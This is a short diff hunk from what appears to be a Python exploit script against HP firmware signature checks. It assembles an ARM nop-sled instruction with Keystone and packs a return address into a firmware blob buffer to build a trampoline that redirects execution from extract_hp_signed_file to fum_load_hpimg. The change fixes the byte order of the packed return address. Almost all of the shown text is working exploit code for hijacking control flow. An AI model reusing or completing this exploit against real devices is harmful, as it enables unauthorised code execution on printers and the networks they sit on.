@@ -95,7 +95,7 @@ print "[+] compiling trampoline"
 nop_ins = ''.join(chr(x) for x in ks.asm("SUBPL    r3, r1, #56")[0])
 bad_reg = "BEEF"
 
-ret_addr = struct.pack('L', HPIMAGE_BLOB_TMP_ADDR+0x100)[:3]
+ret_addr = struct.pack('<L', HPIMAGE_BLOB_TMP_ADDR+0x100)[:3]
 
 
 # generate trampoline, ret from extract_hp_signed_file to fum_load_hpimg
